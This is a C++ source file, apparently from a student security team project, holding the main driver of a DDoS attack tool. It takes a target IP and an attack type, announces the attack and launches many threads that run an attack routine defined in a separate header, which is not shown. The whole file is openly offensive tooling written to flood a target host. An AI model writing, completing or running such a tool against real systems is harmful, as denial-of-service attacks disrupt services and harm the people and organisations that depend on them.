/* Last Update : 2020.07.20
 * Best Of Best 9th team project
 * Team DDoS Gen.
 */

// main loop for ddos
#include <iostream>
#include <stdlib.h>
#include <pthread.h>
#include "defineddata.h"
#include "attackroutine.h"

using namespace std;

int main(int argc, char* argv[]){
    
    if(argc < 3){
        printf("Usage: %s  <target ip>  <attack type #>\n", argv[0]);
        cout << "<<<< ATTACK TYPE NUMBER TABLE >>>>\n";
        /* print attack table here */
        exit(1);
    }
    
    cout << "DDoS Attack Starting..." << endl;
    cout << "target IP: " << argv[1] << '\n' << "attack type: " << argv[2] << endl;

    pthread_t AttackThreads[THREADS];
    for(int i = 0; i < THREADS; i++){
        pthread_create(&AttackThreads[i], NULL, attack_routine, argv[2]);
    }
    for(int i = 0; i < THREADS; i++){
        pthread_join(AttackThreads[i], NULL);
    }
    
    cout << "done" << endl;
    return 0;
}